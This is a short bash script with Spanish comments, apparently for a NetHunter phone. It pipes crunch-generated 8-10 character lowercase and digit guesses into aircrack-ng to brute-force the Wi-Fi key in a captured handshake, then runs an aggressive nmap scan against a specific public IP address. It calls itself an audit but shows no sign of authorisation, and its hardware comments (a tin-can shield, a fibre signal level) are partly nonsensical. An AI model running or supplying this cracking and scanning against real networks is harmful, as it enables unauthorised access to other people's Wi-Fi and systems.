#!/bin/bash
# --- CONFIGURACIÓN DE HARDWARE ---
# Voltaje: 7V (Pila soporte) | Señal: -6dB (Fibra)
# Interfaz: Wlan0 (NetHunter/Motorola)
DICCIONARIO_MIN=8
DICCIONARIO_MAX=10                                                                                   CARACTERES="abcdefghijklmnopqrstuvwxyz0123456789"
ARCHIVO_CAP="/root/WiFiBroot/capture.cap"
BSSID="XX:XX:XX:XX:XX:XX"
echo "[Nexus] Iniciando auditoría: Crunch + Aircrack-ng"
echo "[Info] Optimizando para señal de fibra y blindaje de chasis (lata)"
# Integración Directa:
# Crunch genera las combinaciones -> Aircrack-ng las procesa al vuelo
crunch $DICCIONARIO_MIN $DICCIONARIO_MAX $CARACTERES | aircrack-ng -w - $ARCHIVO_CAP -b $BSSID
# Llamada al monitor de tennesy (opcional si lo compilas como ejecutable independiente)
# ./monitor_db -6.0
nmap -Pn 42.112.200.125 -A -vvv